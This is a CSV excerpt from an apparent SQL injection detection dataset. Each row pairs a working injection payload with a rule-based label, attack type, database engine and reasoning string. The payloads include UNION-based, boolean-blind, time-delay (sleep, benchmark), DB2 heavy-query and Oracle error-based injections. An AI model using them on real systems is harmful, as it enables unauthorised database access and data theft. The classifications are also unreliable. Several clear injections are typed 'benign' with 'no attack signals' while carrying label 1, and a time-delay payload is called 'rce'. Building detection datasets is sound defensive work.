row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10740,"-7743"" or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10741,"-9928"" ) ) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10742,"1 ) where 9213 = 9213 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
10743,1'|| ( select 'ghby' from dual where 4854 = 4854,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10744,-4032' ) where 5157 = 5157 or 1809 = 2810#,1,,boolean_blind,generic,0.95,5157 = 5157 or detected — boolean_blind injection (priority 8) on generic,rule-based
10745,"1"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""abcm"" like ""abcm",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
10746,1' ) or sleep ( 5 ) and ( 'kgbm' = 'kgbm,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10747,"1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
10748,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) -- xsob",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10749,1 ) where 2307 = 2307,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10750,"1"" ) as ifgl where 2190 = 2190 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
10751,-8999' ) ) ) or 6872 = 6872 and ( ( ( 'jare' = 'jare,1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
10752,"-1254"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
10753,"1' in boolean mode ) and elt ( 9630 = 4765,4765 ) #",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10754,"1%"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""%"" = """,1,,boolean_blind,generic,0.95,rlike  detected — boolean_blind injection (priority 8) on generic,rule-based
10755,"1' ) union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
